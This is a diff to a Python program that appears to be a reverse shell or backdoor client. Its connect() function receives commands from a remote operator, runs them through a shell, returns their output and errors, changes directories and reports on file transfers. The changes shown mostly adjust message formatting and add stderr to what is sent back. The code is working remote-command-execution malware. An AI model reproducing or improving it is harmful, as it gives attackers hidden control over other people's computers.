@@ -15,7 +15,7 @@ def transfer(conn, path):
 
     else:
         conn.send('512'.encode())
-        conn.send('[-]Path/FileAccessError'.encode())
+        conn.send('[-] Path/FileAccessError'.encode())
 
 
 def connect():
@@ -41,7 +41,7 @@ def connect():
                 
             except:
                 client.send('512'.encode())
-                client.send("[-]ErrorTransferringFile".encode())
+                client.send("[-] ErrorTransferringFile".encode())
                 pass
             
         else:
@@ -59,9 +59,9 @@ def connect():
                         os.chdir(command[2:])
                     elif command[2] == ' ':
                             os.chdir(command[3:])
-                            client.send('[+] \n'.encode())
+                            client.send('\n [+] \n'.encode())
                     else:
-                        client.send("[!]you mean 'cd..' or 'cd ..' \n ".encode())
+                        client.send("[!] you mean 'cd..' or 'cd ..' \n ".encode())
 
                 except Exception as e:
                     client.send(('\n' + str(e) + '\n').encode())
@@ -69,9 +69,9 @@ def connect():
             CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                    stdin=subprocess.PIPE)
             
-            if command != 'cd..' and command != 'cd ..' and command != 'cd' and command != 'ls':
-                client.send(CMD.stdout.read())
-            if command != 'cd' and command != 'ls':
+            if command != 'cd..' and command != 'cd ..' and command != 'cd':
+                client.send(CMD.stdout.read()+ CMD.stderr.read())
+            if command != 'cd':
                 client.send(str.encode(os.getcwd()+'> '))
 
 def main():
